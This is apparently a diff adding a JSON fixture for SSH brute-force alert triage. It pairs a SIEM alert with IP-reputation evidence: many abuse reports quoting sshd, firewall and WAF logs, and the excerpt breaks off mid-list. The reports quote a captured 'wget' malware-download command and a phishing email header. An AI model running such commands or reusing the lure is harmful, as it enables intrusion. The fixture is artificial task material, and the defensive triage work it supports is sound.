@@ -1,0 +1,2082 @@
+{
+  "alert": {
+    "alert_id": "ALRT-2026-0419-001",
+    "timestamp": "2026-04-19T03:14:22Z",
+    "source": "siem",
+    "severity": "high",
+    "title": "Multiple failed SSH authentications from single source",
+    "raw_log": {
+      "event_type": "auth_failure",
+      "service": "sshd",
+      "host": "prod-web-02.internal",
+      "failed_attempts": 847,
+      "time_window_seconds": 180,
+      "usernames_tried": [
+        "root",
+        "admin",
+        "ubuntu",
+        "oracle",
+        "postgres",
+        "git"
+      ],
+      "source_ip": "185.220.101.47",
+      "destination_port": 22,
+      "first_seen": "2026-04-19T03:11:22Z",
+      "last_seen": "2026-04-19T03:14:22Z"
+    },
+    "indicators": {
+      "ips": [
+        "185.220.101.47"
+      ],
+      "hashes": [],
+      "users": [
+        "root",
+        "admin",
+        "ubuntu"
+      ]
+    }
+  },
+  "evidence_raw": [
+    {
+      "source_tool": "check_ip_reputation",
+      "claim": "IP 185.220.101.47 has abuse confidence 100/100 (92 reports, country=DE, usage=Fixed Line ISP)",
+      "raw_data": {
+        "ipAddress": "185.220.101.47",
+        "isPublic": true,
+        "ipVersion": 4,
+        "isWhitelisted": false,
+        "abuseConfidenceScore": 100,
+        "countryCode": "DE",
+        "usageType": "Fixed Line ISP",
+        "isp": "Network for Tor-Exit traffic.",
+        "domain": "for-privacy.net",
+        "hostnames": [
+          "tor-exit-47.for-privacy.net"
+        ],
+        "isTor": true,
+        "countryName": "Germany",
+        "totalReports": 92,
+        "numDistinctUsers": 52,
+        "lastReportedAt": "2026-04-22T03:10:28+00:00",
+        "reports": [
+          {
+            "reportedAt": "2026-04-22T03:10:28+00:00",
+            "comment": "DirectAdmin Auto Report (ir-tc.com.log)",
+            "categories": [
+              18,
+              22
+            ],
+            "reporterId": 249233,
+            "fromIpCountryCode": "FR",
+            "fromIpCountryName": "France"
+          },
+          {
+            "reportedAt": "2026-04-18T22:00:32+00:00",
+            "comment": "Report By Secure Gateway Security Team: Unsolicited Connection Attempt",
+            "categories": [
+              15
+            ],
+            "reporterId": 113419,
+            "fromIpCountryCode": "US",
+            "fromIpCountryName": "United States of America"
+          },
+          {
+            "reportedAt": "2026-04-18T22:00:32+00:00",
+            "comment": "Report By ALSCO Security Team: Unauthorized Connection Attempt",
+            "categories": [
+              16
+            ],
+            "reporterId": 125807,
+            "fromIpCountryCode": "US",
+            "fromIpCountryName": "United States of America"
+          },
+          {
+            "reportedAt": "2026-04-18T11:59:02+00:00",
+            "comment": "This IP was involved in an brute force and password spray attack on 2026/04/18 06:57:50",
+            "categories": [
+              14,
+              18,
+              20,
+              21
+            ],
+            "reporterId": 171176,
+            "fromIpCountryCode": "IE",
+            "fromIpCountryName": "Ireland"
+          },
+          {
+            "reportedAt": "2026-04-18T04:33:00+00:00",
+            "comment": "Many_bad_calls",
+            "categories": [
+              21
+            ],
+            "reporterId": 11273,
+            "fromIpCountryCode": "BE",
+            "fromIpCountryName": "Belgium"
+          },
+          {
+            "reportedAt": "2026-04-17T11:31:28+00:00",
+            "comment": "2026-04-17T13:31:16.978548+02:00 Linux11 sshd-session[2914766]: Invalid user ftp from 185.220.101.47 port 4231\n2026-04-17T13:31:18.663978+02:00 Linux11 sshd-session[2914646]: Failed password for invalid user ftproot from 185.220.101.47 port 28061 ssh2\n2026-04-17T13:31:17.159627+02:00 Linux11 sshd-session[2914766]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.47\n2026-04-17T13:31:18.756999+02:00 Linux11 sshd-session[2914766]: Failed password for invalid user ftp from 185.220.101.47 port 4231 ssh2\n2026-04-17T13:31:19.951202+02:00 Linux11 sshd-session[2914888]: Invalid user ftproot from 185.220.101.47 port 4233\n2026-04-17T13:31:21.134985+02:00 Linux11 sshd-session[2914646]: Failed password for invalid user ftproot from 185.220.101.47 port 28061 ssh2\n2026-04-17T13:31:20.103413+02:00 Linux11 sshd-session[2914888]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.47\n2026-04-17T13:31:22.11\n...",
+            "categories": [
+              18,
+              22
+            ],
+            "reporterId": 60158,
+            "fromIpCountryCode": "FI",
+            "fromIpCountryName": "Finland"
+          },
+          {
+            "reportedAt": "2026-04-15T11:43:44+00:00",
+            "comment": "Automatic report for brute force attack",
+            "categories": [
+              19
+            ],
+            "reporterId": 278024,
+            "fromIpCountryCode": "IT",
+            "fromIpCountryName": "Italy"
+          },
+          {
+            "reportedAt": "2026-04-15T00:50:08+00:00",
+            "comment": "Blocked by UFW (TCP on 56143)\nSource port: 46427\nTTL: 47\nPacket length: 60\nTOS: 0x08\n\nThis report (for 185.220.101.47) was generated by:\nhttps://github.com/sefinek/UFW-AbuseIPDB-Reporter",
+            "categories": [
+              14
+            ],
+            "reporterId": 209271,
+            "fromIpCountryCode": "US",
+            "fromIpCountryName": "United States of America"
+          },
+          {
+            "reportedAt": "2026-04-15T00:36:10+00:00",
+            "comment": "Rule : PLESK BOT\n2026-04-15 02:08:09 Unauthorized login attempt to Plesk Panel from IP 185.220.101.47 with username admin",
+            "categories": [
+              15,
+              18,
+              21
+            ],
+            "reporterId": 143920,
+            "fromIpCountryCode": "FR",
+            "fromIpCountryName": "France"
+          },
+          {
+            "reportedAt": "2026-04-14T03:52:07+00:00",
+            "comment": "Honeypot [honeypot-ca-sensor1]: SMB traffic on port 445",
+            "categories": [
+              15
+            ],
+            "reporterId": 76245,
+            "fromIpCountryCode": "CA",
+            "fromIpCountryName": "Canada"
+          },
+          {
+            "reportedAt": "2026-04-13T18:34:47+00:00",
+            "comment": "Form spam",
+            "categories": [
+              10
+            ],
+            "reporterId": 86372,
+            "fromIpCountryCode": "AU",
+            "fromIpCountryName": "Australia"
+          },
+          {
+            "reportedAt": "2026-04-08T09:15:15+00:00",
+            "comment": "2026-04-08T10:15:14+01:00 NAS [Wed Apr 08 10:15:14.620370 2026] [authz_core:error] [pid 6878:tid 6908] [client 185.220.101.47:38960] AH01630: client denied by server configuration: /var/services/web/.DS_Store\n...",
+            "categories": [
+              18,
+              15
+            ],
+            "reporterId": 13399,
+            "fromIpCountryCode": "GB",
+            "fromIpCountryName": "United Kingdom of Great Britain and Northern Ireland"
+          },
+          {
+            "reportedAt": "2026-04-08T05:02:08+00:00",
+            "comment": "2026-04-08T05:01:10.494348+00:00 Linux13 sshd-session[2510502]: Failed password for invalid user newuser from 185.220.101.47 port 64531 ssh2\n2026-04-08T05:01:10.562968+00:00 Linux13 sshd-session[2510651]: Invalid user newuser from 185.220.101.47 port 64537\n2026-04-08T05:01:12.629351+00:00 Linux13 sshd-session[2510502]: Failed password for invalid user newuser from 185.220.101.47 port 64531 ssh2\n2026-04-08T05:01:10.836637+00:00 Linux13 sshd-session[2510651]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.47\n2026-04-08T05:01:13.513350+00:00 Linux13 sshd-session[2510651]: Failed password for invalid user newuser from 185.220.101.47 port 64537 ssh2\n2026-04-08T05:01:14.536344+00:00 Linux13 sshd-session[2510502]: Failed password for invalid user newuser from 185.220.101.47 port 64531 ssh2\n2026-04-08T05:01:16.784353+00:00 Linux13 sshd-session[2510502]: Failed password for invalid user newuser from 185.220.101.47 port 64531 ssh2\n2026-04-08T0\n...",
+            "categories": [
+              18,
+              22
+            ],
+            "reporterId": 60158,
+            "fromIpCountryCode": "FI",
+            "fromIpCountryName": "Finland"
+          },
+          {
+            "reportedAt": "2026-04-07T19:45:12+00:00",
+            "comment": "Plesk panel login attempt with forbidden username (root/admin), blocked by Fail2Ban in custom-plesk-login jail",
+            "categories": [
+              18,
+              21
+            ],
+            "reporterId": 169612,
+            "fromIpCountryCode": "DE",
+            "fromIpCountryName": "Germany"
+          },
+          {
+            "reportedAt": "2026-04-06T21:00:00+00:00",
+            "comment": "",
+            "categories": [
+              11,
+              7
+            ],
+            "reporterId": 286706,
+            "fromIpCountryCode": "IL",
+            "fromIpCountryName": "Israel"
+          },
+          {
+            "reportedAt": "2026-04-04T23:41:11+00:00",
+            "comment": "Rule : PLESK BOT\n2026-04-04 17:40:15 Unauthorized login attempt to Plesk Panel from IP 185.220.101.47 with username admin",
+            "categories": [
+              15,
+              18,
+              21
+            ],
+            "reporterId": 143920,
+            "fromIpCountryCode": "FR",
+            "fromIpCountryName": "France"
+          },
+          {
+            "reportedAt": "2026-04-04T03:20:03+00:00",
+            "comment": "Website Scanning / Scraping",
+            "categories": [
+              19,
+              20,
+              21
+            ],
+            "reporterId": 152128,
+            "fromIpCountryCode": "IT",
+            "fromIpCountryName": "Italy"
+          },
+          {
+            "reportedAt": "2026-04-02T21:43:34+00:00",
+            "comment": "Web App Attack",
+            "categories": [
+              21
+            ],
+            "reporterId": 15911,
+            "fromIpCountryCode": "DE",
+            "fromIpCountryName": "Germany"
+          },
+          {
+            "reportedAt": "2026-04-02T09:43:59+00:00",
+            "comment": "HTTP vulnerability scanning",
+            "categories": [
+              21
+            ],
+            "reporterId": 258806,
+            "fromIpCountryCode": "DE",
+            "fromIpCountryName": "Germany"
+          },
+          {
+            "reportedAt": "2026-03-31T20:06:56+00:00",
+            "comment": "SQL Injection, Web App Attack, suspicious: SQLi, SQLi (encoding)",
+            "categories": [
+              16,
+              21
+            ],
+            "reporterId": 274897,
+            "fromIpCountryCode": "US",
+            "fromIpCountryName": "United States of America"
+          },
+          {
+            "reportedAt": "2026-03-29T22:06:11+00:00",
+            "comment": "Common web attack from 185.220.101.47.",
+            "categories": [
+              21
+            ],
+            "reporterId": 147222,
+            "fromIpCountryCode": "FR",
+            "fromIpCountryName": "France"
+          },
+          {
+            "reportedAt": "2026-03-29T05:30:02+00:00",
+            "comment": "2026-03-29 05:30:02 UTC Unauthorized activity to TCP port 22. SSH",
+            "categories": [
+              22
+            ],
+            "reporterId": 56992,
+            "fromIpCountryCode": "US",
+            "fromIpCountryName": "United States of America"
+          },
+          {
+            "reportedAt": "2026-03-28T03:00:42+00:00",
+            "comment": "Rule : PLESK BOT\n2026-03-27 18:07:21 Unauthorized login attempt to Plesk Panel from IP 185.220.101.47 with username root",
+            "categories": [
+              15,
+              18,
+              21
+            ],
+            "reporterId": 216703,
+            "fromIpCountryCode": "FR",
+            "fromIpCountryName": "France"
+          },
+          {
+            "reportedAt": "2026-03-27T07:58:53+00:00",
+            "comment": "2026-03-27 07:58:53 UTC | \ud83d\udcb3 Bitcoin Cash Post- | badkitti77@gxmail.to | http://telegra.ph/Blockchaincom-03-17-6 | 185.220.101.47 | Mozilla/5.0 (Linux; Android 4.1.1; G2SMNT Build/JRO03C-AOC-BZ-20140826) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.91 Safari/537.36 | 1m2wbe | comment",
+            "categories": [
+              12
+            ],
+            "reporterId": 12478,
+            "fromIpCountryCode": "GB",
+            "fromIpCountryName": "United Kingdom of Great Britain and Northern Ireland"
+          },
+          {
+            "reportedAt": "2026-03-26T18:14:11+00:00",
+            "comment": "[HP01-SRV01-FR] Blocked by SysWarden Firewall (Port Scan / Probing Port 553)",
+            "categories": [
+              14
+            ],
+            "reporterId": 133059,
+            "fromIpCountryCode": "FR",
+            "fromIpCountryName": "France"
+          },
+          {
+            "reportedAt": "2026-03-26T12:57:15+00:00",
+            "comment": "Form spam",
+            "categories": [
+              10
+            ],
+            "reporterId": 86372,
+            "fromIpCountryCode": "GB",
+            "fromIpCountryName": "United Kingdom of Great Britain and Northern Ireland"
+          },
+          {
+            "reportedAt": "2026-03-25T13:02:08+00:00",
+            "comment": "Blocked by UFW (TCP on 5467)\nSource port: 38719\nTTL: 46\nPacket length: 60\nTOS: 0x08\n\nThis report (for 185.220.101.47) was generated by:\nhttps://github.com/sefinek/UFW-AbuseIPDB-Reporter",
+            "categories": [
+              14
+            ],
+            "reporterId": 209271,
+            "fromIpCountryCode": "US",
+            "fromIpCountryName": "United States of America"
+          },
+          {
+            "reportedAt": "2026-03-22T09:30:13+00:00",
+            "comment": "Web App Attack",
+            "categories": [
+              18,
+              21
+            ],
+            "reporterId": 183137,
+            "fromIpCountryCode": "FR",
+            "fromIpCountryName": "France"
+          },
+          {
+            "reportedAt": "2026-03-21T21:41:28+00:00",
+            "comment": "Blocked by UFW (TCP on 1)\nSource port: 55535\nTTL: 46\nPacket length: 60\nTOS: 0x08\n\nThis report (for 185.220.101.47) was generated by:\nhttps://github.com/sefinek/UFW-AbuseIPDB-Reporter",
+            "categories": [
+              14
+            ],
+            "reporterId": 209271,
+            "fromIpCountryCode": "US",
+            "fromIpCountryName": "United States of America"
+          },
+          {
+            "reportedAt": "2026-03-18T21:17:05+00:00",
+            "comment": "request_uri: / -- automatic report --",
+            "categories": [
+              18,
+              15
+            ],
+            "reporterId": 73463,
+            "fromIpCountryCode": "DE",
+            "fromIpCountryName": "Germany"
+          },
+          {
+            "reportedAt": "2026-03-17T19:03:02+00:00",
+            "comment": "2026-03-17 10:00:45,571 fail2ban.actions        [3511917]: NOTICE  [tor] Ban 185.220.101.47\n2026-03-17 13:00:27,570 fail2ban.actions        [3511917]: NOTICE  [tor] Ban 185.220.101.47\n2026-03-17 16:00:20,065 fail2ban.actions        [3511917]: NOTICE  [tor] Ban 185.220.101.47\n2026-03-17 19:00:52,881 fail2ban.actions        [3511917]: NOTICE  [tor] Ban 185.220.101.47\n2026-03-17 21:02:21,317 fail2ban.actions        [3511917]: NOTICE  [tor] Ban 185.220.101.47",
+            "categories": [
+              18
+            ],
+            "reporterId": 276232,
+            "fromIpCountryCode": "DE",
+            "fromIpCountryName": "Germany"
+          },
+          {
+            "reportedAt": "2026-03-17T10:14:25+00:00",
+            "comment": "Try to access /xmlrpc.php",
+            "categories": [
+              21
+            ],
+            "reporterId": 25736,
+            "fromIpCountryCode": "DE",
+            "fromIpCountryName": "Germany"
+          },
+          {
+            "reportedAt": "2026-03-16T08:19:26+00:00",
+            "comment": "Blocking for trying to access an exploit file: /myagent.site",
+            "categories": [
+              15
+            ],
+            "reporterId": 20490,
+            "fromIpCountryCode": "US",
+            "fromIpCountryName": "United States of America"
+          },
+          {
+            "reportedAt": "2026-03-15T05:50:33+00:00",
+            "comment": "Connection to port 443 with data transfer.\nData preview: \u0016\u0003\u0001",
+            "categories": [
+              14,
+              15
+            ],
+            "reporterId": 246098,
+            "fromIpCountryCode": "US",
+            "fromIpCountryName": "United States of America"
+          },
+          {
+            "reportedAt": "2026-03-14T05:31:26+00:00",
+            "comment": "185.220.101.47 - - [14/Mar/2026:06:31:26 +0100] \"GET /.git/HEAD HTTP/1.1\" 404 3208 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36\"\n...",
+            "categories": [
+              7,
+              18,
+              21
+            ],
+            "reporterId": 136589,
+            "fromIpCountryCode": "NL",
+            "fromIpCountryName": "Netherlands"
+          },
+          {
+            "reportedAt": "2026-03-13T05:37:29+00:00",
+            "comment": "2026-03-13T13:36:29.950991 honorable-confusion sshd[914785]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.47\n2026-03-13T13:36:31.855803 honorable-confusion sshd[914785]: Failed password for invalid user administrator from 185.220.101.47 port 61811 ssh2\n...",
+            "categories": [
+              18,
+              22
+            ],
+            "reporterId": 198075,
+            "fromIpCountryCode": "TW",
+            "fromIpCountryName": "Taiwan"
+          },
+          {
+            "reportedAt": "2026-03-13T00:17:16+00:00",
+            "comment": "185.220.101.47 - - [12/Mar/2026:18:17:12 -0600] \"GET /xmlrpc.php?rsd HTTP/2.0\" 200 768 \"https://dooce.com/xmlrpc.php?rsd\" \"Mozilla/5.0 (Linux; Android 9; FLA-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36\"\n...",
+            "categories": [
+              21
+            ],
+            "reporterId": 209271,
+            "fromIpCountryCode": "US",
+            "fromIpCountryName": "United States of America"
+          },
+          {
+            "reportedAt": "2026-03-13T00:11:28+00:00",
+            "comment": "Form spam",
+            "categories": [
+              10
+            ],
+            "reporterId": 86372,
+            "fromIpCountryCode": "AU",
+            "fromIpCountryName": "Australia"
+          },
+          {
+            "reportedAt": "2026-03-12T16:21:48+00:00",
+            "comment": "Blocked by UFW (TCP on 31909)\nSource port: 42517\nTTL: 46\nPacket length: 60\nTOS: 0x08\n\nThis report (for 185.220.101.47) was generated by:\nhttps://github.com/sefinek/UFW-AbuseIPDB-Reporter",
+            "categories": [
+              14
+            ],
+            "reporterId": 209271,
+            "fromIpCountryCode": "US",
+            "fromIpCountryName": "United States of America"
+          },
+          {
+            "reportedAt": "2026-03-12T07:10:03+00:00",
+            "comment": "IP banned by Fail2Ban in jail nginx-abusive-ips",
+            "categories": [
+              21,
+              18,
+              19
+            ],
+            "reporterId": 190082,
+            "fromIpCountryCode": "IT",
+            "fromIpCountryName": "Italy"
+          },
+          {
+            "reportedAt": "2026-03-11T18:32:07+00:00",
+            "comment": "SSH Bruteforce attempt with erpnext:erpnext on company server",
+            "categories": [
+              18,
+              22,
+              15
+            ],
+            "reporterId": 239738,
+            "fromIpCountryCode": "FR",
+            "fromIpCountryName": "France"
+          },
+          {
+            "reportedAt": "2026-03-09T21:47:48+00:00",
+            "comment": "Blocked by UFW (TCP on 35918)\nSource port: 39835\nTTL: 46\nPacket length: 60\nTOS: 0x08\n\nThis report (for 185.220.101.47) was generated by:\nhttps://github.com/sefinek/UFW-AbuseIPDB-Reporter",
+            "categories": [
+              14
+            ],
+            "reporterId": 209271,
+            "fromIpCountryCode": "US",
+            "fromIpCountryName": "United States of America"
+          },
+          {
+            "reportedAt": "2026-03-09T00:14:06+00:00",
+            "comment": "2026-03-08T20:14:03.436363 MikuHK sshd[657093]: Invalid user administrator from 185.220.101.47 port 17693\n2026-03-08T20:14:03.498784 MikuHK sshd[657130]: Invalid user administrator from 185.220.101.47 port 17699\n...",
+            "categories": [
+              18,
+              22
+            ],
+            "reporterId": 198075,
+            "fromIpCountryCode": "HK",
+            "fromIpCountryName": "Hong Kong"
+          },
+          {
+            "reportedAt": "2026-03-08T21:45:03+00:00",
+            "comment": "Repeated requests on blocked xmlrpc.php, blocked by fail2ban in custom-503-xmlrpc jail",
+            "categories": [
+              19,
+              21
+            ],
+            "reporterId": 169612,
+            "fromIpCountryCode": "DE",
+            "fromIpCountryName": "Germany"
+          },
+          {
+            "reportedAt": "2026-03-08T21:05:21+00:00",
+            "comment": "Brute Force, tcp/22",
+            "categories": [
+              18
+            ],
+            "reporterId": 191328,
+            "fromIpCountryCode": "TR",
+            "fromIpCountryName": "Turkey"
+          },
+          {
+            "reportedAt": "2026-03-07T06:11:28+00:00",
+            "comment": "Blocked by UFW (TCP on 37230)\nSource port: 15839\nTTL: 46\nPacket length: 60\nTOS: 0x08\n\nThis report (for 185.220.101.47) was generated by:\nhttps://github.com/sefinek/UFW-AbuseIPDB-Reporter",
+            "categories": [
+              14
+            ],
+            "reporterId": 209271,
+            "fromIpCountryCode": "US",
+            "fromIpCountryName": "United States of America"
+          },
+          {
+            "reportedAt": "2026-03-05T17:34:00+00:00",
+            "comment": "phishing attempt from 127.0.0.1 ([185.220.101.47])\r\nSubject: Re: PLEASE ENSURE THAT ALL REQUIRED STEPS ARE FULFILLED TO RECEIVE YOUR PAYMENT\r\nDate: Thu, 5 Mar 2026 22:29:36 +0500\r\nAction must be taken before time expires.\r\nContent-Type: application/octet-stream; name=\"xejwuyqxbl.pdf\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename=\"xejwuyqxbl.pdf\"\r\n",
+            "categories": [
+              11,
+              17,
+              20,
+              7
+            ],
+            "reporterId": 13286,
+            "fromIpCountryCode": "GB",
+            "fromIpCountryName": "United Kingdom of Great Britain and Northern Ireland"
+          },
+          {
+            "reportedAt": "2026-03-05T00:56:02+00:00",
+            "comment": "Mail - Multiple failed login attempts",
+            "categories": [
+              18,
+              20
+            ],
+            "reporterId": 152128,
+            "fromIpCountryCode": "IT",
+            "fromIpCountryName": "Italy"
+          },
+          {
+            "reportedAt": "2026-03-04T11:19:28+00:00",
+            "comment": "Blocked by UFW (TCP on 64696)\nSource port: 37823\nTTL: 46\nPacket length: 60\nTOS: 0x08\n\nThis report (for 185.220.101.47) was generated by:\nhttps://github.com/sefinek/UFW-AbuseIPDB-Reporter",
+            "categories": [
+              14
+            ],
+            "reporterId": 209271,
+            "fromIpCountryCode": "US",
+            "fromIpCountryName": "United States of America"
+          },
+          {
+            "reportedAt": "2026-03-03T19:39:08+00:00",
+            "comment": "Blocked by UFW (TCP on 61227)\nSource port: 59829\nTTL: 46\nPacket length: 60\nTOS: 0x08\n\nThis report (for 185.220.101.47) was generated by:\nhttps://github.com/sefinek/UFW-AbuseIPDB-Reporter",
+            "categories": [
+              14
+            ],
+            "reporterId": 209271,
+            "fromIpCountryCode": "US",
+            "fromIpCountryName": "United States of America"
+          },
+          {
+            "reportedAt": "2026-03-03T03:46:34+00:00",
+            "comment": "Brute force",
+            "categories": [
+              18
+            ],
+            "reporterId": 156990,
+            "fromIpCountryCode": "ES",
+            "fromIpCountryName": "Spain"
+          },
+          {
+            "reportedAt": "2026-03-02T11:14:08+00:00",
+            "comment": "Requests denied due to proxy/VPN risk (tenant=82 method=GET path=/browse-by-car-model/volvo.html ua='Mozilla/5.0 (Linux; arm_64; Android 9; CPH1917) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 YaBrowser/20.3.4.98.00 SA/1 Mobile Safari/537.36')",
+            "categories": [
+              9,
+              13
+            ],
+            "reporterId": 242376,
+            "fromIpCountryCode": "US",
+            "fromIpCountryName": "United States of America"
+          },
+          {
+            "reportedAt": "2026-03-02T00:38:47+00:00",
+            "comment": "ThreatBook Intelligence: tor_proxy,Zombie more details on https://threatbook.io/ip/185.220.101.47\n2026-03-01 23:37:45 /",
+            "categories": [
+              22
+            ],
+            "reporterId": 56171,
+            "fromIpCountryCode": "CN",
+            "fromIpCountryName": "China"
+          },
+          {
+            "reportedAt": "2026-03-01T14:07:52+00:00",
+            "comment": "Try to access /xmlrpc.php",
+            "categories": [
+              21
+            ],
+            "reporterId": 25736,
+            "fromIpCountryCode": "DE",
+            "fromIpCountryName": "Germany"
+          },
+          {
+            "reportedAt": "2026-03-01T03:03:46+00:00",
+            "comment": "Form spam",
+            "categories": [
+              10
+            ],
+            "reporterId": 86372,
+            "fromIpCountryCode": "AU",
+            "fromIpCountryName": "Australia"
+          },
+          {
+            "reportedAt": "2026-02-28T13:24:53+00:00",
+            "comment": "Feb 28 15:24:51 ipht sshd[434788]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.47 \nFeb 28 15:24:51 ipht sshd[434788]: Invalid user kafka from 185.220.101.47 port 23647\nFeb 28 15:24:53 ipht sshd[434788]: Failed password for invalid user kafka from 185.220.101.47 port 23647 ssh2\n...",
+            "categories": [
+              18,
+              22
+            ],
+            "reporterId": 23136,
+            "fromIpCountryCode": "UA",
+            "fromIpCountryName": "Ukraine"
+          },
+          {
+            "reportedAt": "2026-02-27T02:48:59+00:00",
+            "comment": "2026-02-27T02:48:59.489111+00:00 server dovecot: imap-login: Disconnected: Connection closed (no auth attempts in 0 secs): user=, rip=185.220.101.47, lip=X.X.X.X session=",
+            "categories": [
+              14,
+              15
+            ],
+            "reporterId": 72644,
+            "fromIpCountryCode": "US",
+            "fromIpCountryName": "United States of America"
+          },
+          {
+            "reportedAt": "2026-02-26T14:25:59+00:00",
+            "comment": "Detected Hacking, SQL Injection or general Web App Attack",
+            "categories": [
+              21
+            ],
+            "reporterId": 31924,
+            "fromIpCountryCode": "CZ",
+            "fromIpCountryName": "Czechia"
+          },
+          {
+            "reportedAt": "2026-02-26T10:44:45+00:00",
+            "comment": "2026-02-26 10:44:44 185.220.101.47 Spam word detected.",
+            "categories": [
+              10
+            ],
+            "reporterId": 70637,
+            "fromIpCountryCode": "IE",
+            "fromIpCountryName": "Ireland"
+          },
+          {
+            "reportedAt": "2026-02-26T10:03:08+00:00",
+            "comment": "Blocked by UFW (TCP on 49919)\nSource port: 21379\nTTL: 47\nPacket length: 60\nTOS: 0x08\n\nThis report (for 185.220.101.47) was generated by:\nhttps://github.com/sefinek/UFW-AbuseIPDB-Reporter",
+            "categories": [
+              14
+            ],
+            "reporterId": 209271,
+            "fromIpCountryCode": "US",
+            "fromIpCountryName": "United States of America"
+          },
+          {
+            "reportedAt": "2026-02-24T05:25:28+00:00",
+            "comment": "Blocked by UFW (TCP on 6969)\nSource port: 9131\nTTL: 47\nPacket length: 60\nTOS: 0x08\n\nThis report (for 185.220.101.47) was generated by:\nhttps://github.com/sefinek/UFW-AbuseIPDB-Reporter",
+            "categories": [
+              14
+            ],
+            "reporterId": 209271,
+            "fromIpCountryCode": "US",
+            "fromIpCountryName": "United States of America"
+          },
+          {
+            "reportedAt": "2026-02-24T01:23:50+00:00",
+            "comment": "Malware download/execution attempt - Commands: wget https://meowbot.is.a.pedophile.com",
+            "categories": [
+              15
+            ],
+            "reporterId": 273362,
+            "fromIpCountryCode": "DE",
+            "fromIpCountryName": "Germany"
+          },
+          {
+            "reportedAt": "2026-02-23T12:32:28+00:00",
+            "comment": "Blocked by UFW (TCP on 54407)\nSource port: 24539\nTTL: 47\nPacket length: 60\nTOS: 0x08\n\nThis report (for 185.220.101.47) was generated by:\nhttps://github.com/sefinek/UFW-AbuseIPDB-Reporter",
+            "categories": [
+              14
+            ],
+            "reporterId": 209271,
+            "fromIpCountryCode": "US",
+            "fromIpCountryName": "United States of America"
+          },
+          {
+            "reportedAt": "2026-02-22T20:37:28+00:00",
+            "comment": "Blocked by UFW (TCP on 54407)\nSource port: 20883\nTTL: 47\nPacket length: 60\nTOS: 0x08\n\nThis report (for 185.220.101.47) was generated by:\nhttps://github.com/sefinek/UFW-AbuseIPDB-Reporter",
+            "categories": [
+              14
+            ],
+            "reporterId": 209271,
+            "fromIpCountryCode": "US",
+            "fromIpCountryName": "United States of America"
+          },
+          {
+            "reportedAt": "2026-02-22T14:56:55+00:00",
+            "comment": "(mod_security) mod_security (id:210492) triggered by 185.220.101.47 (tor-exit-47.for-privacy.net): 1 in the last 300 secs; Ports: *; Direction: 1; Trigger: LF_MODSEC; Logs: [Sun Feb 22 09:56:50.061739 2026] [security2:error] [pid 5763:tid 5763] [client 185.220.101.47:37493] ModSecurity: Access denied with code 403 (phase 1). Matched phrase \"/.svn/\" at REQUEST_URI. [file \"/etc/apache2/conf.d/modsec_vendor_configs/comodo_apache/02_Global_Generic.conf\"] [line \"117\"] [id \"210492\"] [rev \"3\"] [severity \"CRITICAL\"] [tag \"CWAF\"] [tag \"Generic\"] [hostname \"cityindustries.com\"] [uri \"/.svn/entries\"] [unique_id \"aZsZMnAUvm9thrxRm_SITwAAAAU\"]",
+            "categories": [
+              18,
+              19,
+              21
+            ],
+            "reporterId": 56941,
+            "fromIpCountryCode": "US",
+            "fromIpCountryName": "United States of America"
+          },
+          {
+            "reportedAt": "2026-02-22T01:16:12+00:00",
+            "comment": "(mod_security) mod_security (id:210730) triggered by 185.220.101.47 (tor-exit-47.for-privacy.net): 1 in the last 300 secs; Ports: *; Direction: 1; Trigger: LF_MODSEC; Logs: [Sat Feb 21 20:16:07.013152 2026] [security2:error] [pid 24565:tid 24590] [client 185.220.101.47:43825] ModSecurity: Access denied with code 403 (phase 2). Match of \"pmFromFile userdata_wl_extensions\" against \"TX:extension\" required. [file \"/etc/apache2/conf.d/modsec_vendor_configs/comodo_apache/10_HTTP_HTTP.conf\"] [line \"27\"] [id \"210730\"] [rev \"5\"] [msg \"COMODO WAF: URL file extension is restricted by policy||www.adultbaja.com|F|2\"] [data \".sql\"] [severity \"CRITICAL\"] [tag \"CWAF\"] [tag \"HTTP\"] [hostname \"www.adultbaja.com\"] [uri \"/database.sql\"] [unique_id \"aZpY1ylAArhkzYd4hjb2IgAAANI\"]",
+            "categories": [
+              18,
+              19,
+              21
+            ],
+            "reporterId": 56941,
+            "fromIpCountryCode": "US",
+            "fromIpCountryName": "United States of America"
+          },
+          {
+            "reportedAt": "2026-02-20T21:38:32+00:00",
+            "comment": "Form spam",
+            "categories": [
+              10
+            ],
+            "reporterId": 86372,
+            "fromIpCountryCode": "AU",
+            "fromIpCountryName": "Australia"
+          },
+          {
+            "reportedAt": "2026-02-19T15:08:28+00:00",
+            "comment": "Blocked by UFW (TCP on 45340)\nSource port: 52223\nTTL: 47\nPacket length: 60\nTOS: 0x08\n\nThis report (for 185.220.101.47) was generated by:\nhttps://github.com/sefinek/UFW-AbuseIPDB-Reporter",
+            "categories": [
+              14
+            ],
+            "reporterId": 209271,
+            "fromIpCountryCode": "US",
+            "fromIpCountryName": "United States of America"
+          },
+          {
+            "reportedAt": "2026-02-15T14:53:11+00:00",
+            "comment": "Form spam",
+            "categories": [
+              10
+            ],
+            "reporterId": 86372,
+            "fromIpCountryCode": "AU",
+            "fromIpCountryName": "Australia"
+          },
+          {
+            "reportedAt": "2026-02-13T20:06:19+00:00",
+            "comment": "[SMB remote code execution attempt: port tcp/445] from Tor node 185.220.101.47",
+            "categories": [
+              14,
+              15,
+              18,
+              11,
+              10,
+              21
+            ],
+            "reporterId": 198442,
+            "fromIpCountryCode": "BG",
+            "fromIpCountryName": "Bulgaria"
+          },
+          {
+            "reportedAt": "2026-02-13T12:49:22+00:00",
+            "comment": "(wordpress) Failed wordpress login using wp-login.php or xmlrpc.php",
+            "categories": [
+              21
+            ],
+            "reporterId": 134687,
+            "fromIpCountryCode": "DE",
+            "fromIpCountryName": "Germany"
+          },
+          {
